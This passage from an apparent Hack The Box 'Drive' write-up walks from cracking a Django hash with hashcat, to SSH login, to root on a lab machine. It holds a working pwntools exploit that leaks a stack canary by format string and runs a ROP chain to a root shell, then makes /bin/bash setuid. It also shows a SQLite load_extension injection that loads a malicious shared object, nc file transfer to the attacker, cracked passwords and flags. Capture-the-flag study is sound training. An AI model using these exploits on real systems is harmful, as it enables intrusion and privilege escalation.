  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 124 (Django (SHA-1))
Hash.Target......: hashes
Time.Started.....: Sat Oct 14 21:43:40 2023, (11 secs)
Time.Estimated...: Sat Oct 14 21:43:51 2023, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5738.2 kH/s (0.18ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/5 (20.00%) Digests (total), 1/5 (20.00%) Digests (new), 1/5 (20.00%) Salts
Progress.........: 71721925/71721925 (100.00%)
Rejected.........: 0/71721925 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:4 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 56%

Started: Sat Oct 14 21:43:37 2023
Stopped: Sat Oct 14 21:43:52 2023
```

| Username | Password |
| --- | --- |
| tom | johnmayer7 |

```c
┌──(user㉿kali)-[~]
└─$ ssh tom@drive.htb
tom@drive.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-164-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 14 Oct 2023 08:13:46 PM UTC

  System load:           0.06
  Usage of /:            65.9% of 5.07GB
  Memory usage:          26%
  Swap usage:            0%
  Processes:             238
  Users logged in:       1
  IPv4 address for eth0: 10.129.81.206
  IPv6 address for eth0: dead:beef::250:56ff:fe96:574


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Oct  9 09:19:30 2023 from 10.10.14.40
tom@drive:~$ 
```

## user.txt

```c
tom@drive:~$ cat user.txt 
327b554fb7133fe6c108712a3248861f
```

## Pivoting

```c
tom@drive:~$ id
uid=1003(tom) gid=1003(tom) groups=1003(tom)
```

```c
tom@drive:~$ sudo -l
[sudo] password for tom: 
Sorry, user tom may not run sudo on drive.
```

```c
tom@drive:~$ ls -la
total 916
drwxr-x--- 6 tom  tom    4096 Sep 13 13:51 .
drwxr-xr-x 6 root root   4096 Dec 25  2022 ..
lrwxrwxrwx 1 root root      9 Sep  6 02:56 .bash_history -> /dev/null
-rw-r--r-- 1 tom  tom     220 Dec 25  2022 .bash_logout
-rw-r--r-- 1 tom  tom    3771 Dec 25  2022 .bashrc
drwx------ 3 tom  tom    4096 Jan  1  2023 .cache
drwx------ 3 tom  tom    4096 Feb  3  2023 .config
-rwSr-x--- 1 root tom  887240 Sep 13 13:36 doodleGrive-cli
drwx------ 3 tom  tom    4096 Jan  1  2023 .gnupg
drwxrwxr-x 3 tom  tom    4096 Dec 28  2022 .local
-rw-r--r-- 1 tom  tom     807 Dec 25  2022 .profile
-rw-r----- 1 root tom     719 Feb 11  2023 README.txt
-rw-r----- 1 root tom      33 Oct 14 19:02 user.txt
-rw-r--r-- 1 tom  tom      39 Aug 29 05:59 .vimrc
```

```c
tom@drive:~$ cat README.txt 
Hi team
after the great success of DoodleGrive, we are planning now to start working on our new project: "DoodleGrive self hosted",it will allow our customers to deploy their own documents sharing platform privately on thier servers...
However in addition with the "new self Hosted release" there should be a tool(doodleGrive-cli) to help the IT team in monitoring server status and fix errors that may happen.
As we mentioned in the last meeting the tool still in the development phase and we should test it properly...
We sent the username and the password in the email for every user to help us in testing the tool and make it better.
If you face any problem, please report it to the development team.
Best regards.
```

## Enumeration of the Binary

```c
tom@drive:~$ strings doodleGrive-cli
<--- SNIP --->
Enter Username:
Enter password for 
moriarty
findMeIfY0uC@nMr.Holmz!
Welcome...!
```

| Username | Password |
| --- | --- |
| moriarty | findMeIfY0uC@nMr.Holmz! |

```c
tom@drive:~$ ./doodleGrive-cli 
[!]Caution this tool still in the development phase...please report any issue to the development team[!]
Enter Username:
moriarty
Enter password for moriarty:
findMeIfY0uC@nMr.Holmz!
Welcome...!

doodleGrive cli beta-2.2: 
1. Show users list and info
2. Show groups list
3. Check server health and status
4. Show server requests log (last 1000 request)
5. activate user account
6. Exit
Select option:
```

```c
doodleGrive cli beta-2.2: 
1. Show users list and info
2. Show groups list
3. Check server health and status
4. Show server requests log (last 1000 request)
5. activate user account
6. Exit
Select option: 5
Enter username to activate account: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Activating account for user 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'...
```

## Reversing the Binary

```c
┌──(user㉿kali)-[/media/…/htb/machines/drive/files]
└─$ nc -lnvp 9003 > doodleGrive-cli
listening on [any] 9003 ...
```

```c
tom@drive:~$ nc 10.10.16.39 9003 < doodleGrive-cli
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/drive/files]
└─$ file doodleGrive-cli 
doodleGrive-cli: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=8c72c265a73f390aa00e69fc06d96f5576d29284, for GNU/Linux 3.2.0, not stripped
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/drive/files]
└─$ checksec doodleGrive-cli 
[*] '/media/sf_infosec/htb/machines/drive/files/doodleGrive-cli'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The program sanitized user input.

```c
void sanitize_string(char *param_1)

{
  bool bVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  int local_3c;
  int local_38;
  uint local_30;
  undefined8 local_29;
  undefined local_21;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_3c = 0;
  local_29 = 0x5c7b2f7c20270a00;
  local_21 = 0x3b;
  local_38 = 0;
  do {
    sVar2 = strlen(param_1);
    if (sVar2 <= (ulong)(long)local_38) {
      param_1[local_3c] = '\0';
      if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
```

## Unintended Way

### Binary Exploitation

> https://ir0nstone.gitbook.io/notes/types/stack/canaries

```c
tom@drive:~$ ./doodleGrive-cli 
[!]Caution this tool still in the development phase...please report any issue to the development team[!]
Enter Username:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Enter password for AAAAAAAAAAAAAAA:
Invalid username or password.
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

```c
tom@drive:~$ ./doodleGrive-cli 
[!]Caution this tool still in the development phase...please report any issue to the development team[!]
Enter Username:
moriarty
Enter password for moriarty:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Invalid username or password.
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

```c
tom@drive:~$ ./doodleGrive-cli 
[!]Caution this tool still in the development phase...please report any issue to the development team[!]
Enter Username:
%15$x
Enter password for dcbaf000:
%15$x
Invalid username or password.
```

### Return Oriented Programming (ROP Chain) for Exploitation

And again, awesome work from `xvt` and `AROx4444`!!

```c
┌──(user㉿kali)-[/media/…/htb/machines/drive/files]
└─$ cat exp.py 
from pwn import *

context.arch='amd64'

target = './doodleGrive-cli'
e = ELF(target)

ssh_host,ssh_user,ssh_pass,ssh_port = 'drive.htb','tom','johnmayer7',22
session = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)

p = session.run('./doodleGrive-cli')
p.sendlineafter(b"Enter Username:\n", b"%15$llx")
p.recvuntil(b"Enter password for ")

canary = int(p.recv(16),16)
log.info(f"canary: {hex(canary)}")

rop = ROP(e)
rop.raw(rop.find_gadget(['ret']).address)
rop.system(next(e.search(b"/bin/sh\x00")))
print(rop.dump())

payload = b"A" * 56 + p64(canary) + p64(0xdeadbeef) + rop.chain()
log.info(f"payload: {payload}")
p.sendline(payload)
log.success("payload sent")
log.success("AMOOOGUUUUSSS")

p.sendline(b"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin")
p.sendline(b"echo 'cat /root/root.txt';cat /root/root.txt")
p.sendline(b"chmod +s /bin/bash")

p.interactive()
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/drive/files]
└─$ python3 exp.py 
[*] '/media/sf_infosec/htb/machines/drive/files/doodleGrive-cli'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Connecting to drive.htb on port 22: Done
[*] tom@drive.htb:
    Distro    Ubuntu 20.04
    OS:       linux
    Arch:     amd64
    Version:  5.4.0
    ASLR:     Enabled
[+] Opening new channel: './doodleGrive-cli': Done
[*] canary: 0x373a951bf29b2400
[*] Loading gadgets for '/media/sf_infosec/htb/machines/drive/files/doodleGrive-cli'
0x0000:         0x40101a ret
0x0008:         0x401912 pop rdi; ret
0x0010:         0x497cd5 [arg0] rdi = 4816085
0x0018:         0x4119d0 system
[*] payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00$\x9b\xf2\x1b\x95:7\xef\xbe\xad\xde\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x12\x19@\x00\x00\x00\x00\x00\xd5|I\x00\x00\x00\x00\x00\xd0\x19A\x00\x00\x00\x00\x00'
[+] payload sent
[+] AMOOOGUUUUSSS
[*] Switching to interactive mode
:
Invalid username or password.
# # cat /root/root.txt
4e6038b466f2542000979e01915db688
# # $
```

## root.txt

```c
4e6038b466f2542000979e01915db688
```

## Intended Way

```c
tom@drive:~$ cat shell.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>

static void shell() __attribute__((constructor));

void shell() {
    system("/bin/bash");
}
```

```c
tom@drive:~$ gcc -shared -o a.so -fPIC shell.c
```

```c
tom@drive:~$ ./doodleGrive-cli 
[!]Caution this tool still in the development phase...please report any issue to the development team[!]
Enter Username:
moriarty
Enter password for moriarty:
findMeIfY0uC@nMr.Holmz!
Welcome...!

doodleGrive cli beta-2.2: 
1. Show users list and info
2. Show groups list
3. Check server health and status
4. Show server requests log (last 1000 request)
5. activate user account
6. Exit
Select option: 5
Enter username to activate account: "or(load_extension(char(46,47,97)))--
Activating account for user '"or(load_extension(char(46,47,97)))--'...
bash: groups: No such file or directory
bash: lesspipe: No such file or directory
bash: dircolors: No such file or directory
root@drive:~#
```

```c
root@drive:~# export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```
